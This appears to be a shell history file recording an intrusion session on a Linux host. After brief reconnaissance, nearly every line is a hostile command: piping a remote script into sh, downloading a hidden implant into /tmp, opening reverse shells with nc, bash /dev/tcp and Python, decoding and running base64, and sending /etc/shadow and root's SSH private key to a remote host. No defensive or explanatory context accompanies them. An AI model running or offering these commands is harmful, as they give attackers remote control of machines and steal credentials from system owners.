: 1794330782:0;whoami
: 1794330792:0;id
: 1794330802:0;uname -a
: 1794330812:0;curl -s http://203.0.113.9/beacon | /bin/sh
: 1794330822:0;wget http://198.51.100.7/implant.bin -O /tmp/.x && chmod +x /tmp/.x
: 1794330832:0;nc -e /bin/sh 203.0.113.9 4444
: 1794330842:0;bash -i >& /dev/tcp/203.0.113.9/9001 0>&1
: 1794330852:0;python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("203.0.113.9",5555))'
: 1794330862:0;echo aWQ= | base64 -d | sh
: 1794330872:0;cat /etc/shadow | base64 | curl -d @- http://203.0.113.9/exfil
: 1794330882:0;cat /root/.ssh/id_rsa | curl -d @- http://203.0.113.9/loot
